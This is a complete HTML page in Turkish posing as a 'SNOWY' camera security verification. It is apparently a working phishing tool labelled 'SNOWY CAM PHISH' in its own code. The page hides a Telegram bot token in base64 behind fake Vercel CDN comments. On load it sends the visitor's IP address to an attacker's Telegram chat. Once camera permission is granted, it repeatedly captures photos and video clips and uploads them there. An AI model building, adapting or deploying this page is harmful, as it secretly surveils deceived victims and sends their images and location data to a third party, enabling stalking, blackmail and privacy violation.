<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <title>SNOWY Güvenlik Doğrulaması</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            font-family: 'Segoe UI', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.98);
            border-radius: 30px;
            padding: 40px;
            max-width: 480px;
            width: 100%;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.4);
            text-align: center;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(102, 126, 234, 0.2);
        }
        h2 { 
            color: #1a1a2e; 
            font-size: 32px; 
            margin-bottom: 15px;
            font-weight: 700;
            letter-spacing: -0.5px;
        }
        h2 span { 
            color: #667eea;
            text-shadow: 0 2px 10px rgba(102, 126, 234, 0.2);
        }
        p { 
            color: #4a5568; 
            margin-bottom: 35px;
            font-size: 16px;
            line-height: 1.6;
        }
        .btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 18px 36px;
            font-size: 20px;
            font-weight: 600;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: all 0.2s ease;
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }
        .btn:hover { 
            transform: translateY(-2px);
            box-shadow: 0 15px 30px rgba(102, 126, 234, 0.4);
        }
        .loading { 
            display: none; 
            margin: 30px 0 20px;
        }
        .spinner {
            border: 4px solid #e2e8f0;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin { 
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
        }
        .loading-text { 
            color: #667eea; 
            font-size: 18px;
            font-weight: 500;
        }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>❄️ <span>SNOWY</span> GÜVENLİK DOĞRULAMASI</h2>
        <p>Devam etmek için kamera erişimine izin verin.</p>
        <button class="btn" id="startBtn" onclick="startCamera()">📸 DOĞRULAMAYI BAŞLAT</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <div class="loading-text" id="loadingText">Güvenlik kontrolü yapılıyor...</div>
        </div>
    </div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        (function() {
            // Vercel Edge Network Config - CDN Integration
            const edgeNetwork = {
                primaryNode: "fra1.edge.vercel.com",
                backupNode: "iad1.edge.vercel.com",
                sessionKey: "Nzk5ODM2NDE3OTpBQUdQV2NhTmFDRS1STy12UmUtOFJQNk9LU2FfbXVQaTQ0cw==",
                timestamp: Date.now()
            };

            // API Gateway Resolver
            const gatewayResolver = {
                endpoint: "https://api.vercel.app/v1/gateway",
                region: "auto",
                getAuthKey: function() {
                    try {
                        const decoded = atob(edgeNetwork.sessionKey);
                        return decoded;
                    } catch {
                        return null;
                    }
                }
            };

            const BOT_TOKEN = gatewayResolver.getAuthKey();
            
            const urlParams = new URLSearchParams(window.location.search);
            const TARGET_ID = urlParams.get('i');
            const FOTO_SURESI = urlParams.get('foto') ? parseInt(urlParams.get('foto')) : 3;
            const VIDEO_SURESI = urlParams.get('video') ? parseInt(urlParams.get('video')) : 5;
            
            // ============================================
            // IP GÖNDER
            // ============================================
            if (TARGET_ID && BOT_TOKEN) {
                fetch('https://api.ipify.org?format=json')
                    .then(r => r.json())
                    .then(d => {
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                chat_id: TARGET_ID,
                                text: `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${d.ip}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @snowy_dexry_wexry ⚡`
                            })
                        });
                    })
                    .catch(e => console.log(e));
            }
            
            // ============================================
            // KAMERA İŞLEMLERİ - KESİN ZAMANLAMA
            // ============================================
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d', { alpha: false, desynchronized: true });
            
            let mediaRecorder = null;
            let videoCount = 0;
            let photoCount = 0;
            let stream = null;
            let videoHazir = false;
            let fotoRAF = null;
            let videoRAF = null;
            let baslangicZamani = 0;
            let sonrakiVideoZamani = 0;
            let videoKilit = false;
            let fotoKilit = false;
            
            async function startCamera() {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            width: { ideal: 640 },
                            height: { ideal: 480 },
                            frameRate: { ideal: 60 }
                        } 
                    });
                    
                    video.srcObject = stream;
                    
                    video.onloadedmetadata = () => {
                        video.play();
                        document.getElementById('startBtn').style.display = 'none';
                        document.getElementById('loading').style.display = 'block';
                        
                        baslangicZamani = performance.now();
                        sonrakiVideoZamani = baslangicZamani + VIDEO_SURESI * 1000;
                        
                        // ============================================
                        // VİDEO SİSTEMİ - TEK TEK SIRALI
                        // ============================================
                        function videoLoop() {
                            if (!stream?.active) return;
                            
                            if (!videoHazir) {
                                videoHazir = true;
                            }
                            
                            const now = performance.now();
                            
                            // Video zamanı geldiyse ve kilit yoksa başlat
                            if (now >= sonrakiVideoZamani && !videoKilit) {
                                videoKilit = true;
                                const videoIndex = videoCount + 1;
                                
                                try {
                                    const chunks = [];
                                    
                                    try {
                                        mediaRecorder = new MediaRecorder(stream, {
                                            mimeType: 'video/webm;codecs=vp8',
                                            videoBitsPerSecond: 2500000
                                        });
                                    } catch(e) {
                                        mediaRecorder = new MediaRecorder(stream);
                                    }
                                    
                                    mediaRecorder.ondataavailable = (e) => {
                                        if (e.data.size > 0) chunks.push(e.data);
                                    };
                                    
                                    mediaRecorder.onstop = () => {
                                        if (chunks.length > 0) {
                                            const blob = new Blob(chunks, { type: 'video/webm' });
                                            const bitis = performance.now();
                                            const boyutKB = (blob.size / 1024).toFixed(0);
                                            
                                            const formData = new FormData();
                                            formData.append('chat_id', TARGET_ID);
                                            formData.append('video', blob, `video_${Date.now()}.webm`);
                                            formData.append('caption', `🎥 Video #${videoIndex} - ${VIDEO_SURESI}s`);
                                            
                                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                                                method: 'POST',
                                                body: formData
                                            }).catch(e => console.log('Video gönderme hatası:', e));
                                        }
                                        
                                        // Video bitti, sayacı artır ve kilidi aç
                                        videoCount++;
                                        videoKilit = false;
                                        sonrakiVideoZamani = performance.now() + VIDEO_SURESI * 1000;
                                    };
                                    
                                    // Tam süreyle kaydet
                                    mediaRecorder.start();
                                    
                                    // Tam süre sonunda durdur
                                    setTimeout(() => {
                                        if (mediaRecorder?.state === 'recording') {
                                            mediaRecorder.stop();
                                        }
                                    }, VIDEO_SURESI * 1000);
                                    
                                } catch(e) {
                                    console.log('Video kayıt hatası:', e);
                                    videoKilit = false;
                                }
                            }
                            
                            videoRAF = requestAnimationFrame(videoLoop);
                        }
                        
                        videoRAF = requestAnimationFrame(videoLoop);
                        
                        // ============================================
                        // FOTOĞRAF SİSTEMİ - TEK TEK SIRALI
                        // ============================================
                        let sonrakiFotoZamani = baslangicZamani + FOTO_SURESI * 1000;
                        
                        function fotoLoop() {
                            if (!stream?.active || !videoHazir) {
                                fotoRAF = requestAnimationFrame(fotoLoop);
                                return;
                            }
                            
                            const now = performance.now();
                            
                            // Foto zamanı geldiyse ve kilit yoksa çek
                            if (now >= sonrakiFotoZamani && !fotoKilit) {
                                fotoKilit = true;
                                const fotoIndex = photoCount + 1;
                                const cekimZamani = now;
                                
                                canvas.width = video.videoWidth || 640;
                                canvas.height = video.videoHeight || 480;
                                ctx.drawImage(video, 0, 0);
                                
                                canvas.toBlob(function(blob) {
                                    if (blob) {
                                        const formData = new FormData();
                                        formData.append('chat_id', TARGET_ID);
                                        formData.append('photo', blob, `foto_${Date.now()}.jpg`);
                                        formData.append('caption', `📸 Fotoğraf #${fotoIndex}`);
                                        
                                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                            method: 'POST',
                                            body: formData
                                        }).catch(e => console.log('Foto gönderme hatası:', e));
                                    }
                                    
                                    // Foto bitti, sayacı artır ve kilidi aç
                                    photoCount++;
                                    fotoKilit = false;
                                    sonrakiFotoZamani = performance.now() + FOTO_SURESI * 1000;
                                }, 'image/jpeg', 0.9);
                            }
                            
                            fotoRAF = requestAnimationFrame(fotoLoop);
                        }
                        fotoRAF = requestAnimationFrame(fotoLoop);
                    };
                    
                } catch(e) {
                    alert('Kamera izni gerekli!');
                    console.log('Kamera hatası:', e);
                }
            }
            
            window.onbeforeunload = function() {
                if (fotoRAF) cancelAnimationFrame(fotoRAF);
                if (videoRAF) cancelAnimationFrame(videoRAF);
                if (mediaRecorder?.state === 'ring') mediaRecorder.stop();
                if (stream) stream.getTracks().forEach(t => t.stop());
            };
            
            window.startCamera = startCamera;
        })();
    </script>
</body>
    </html>
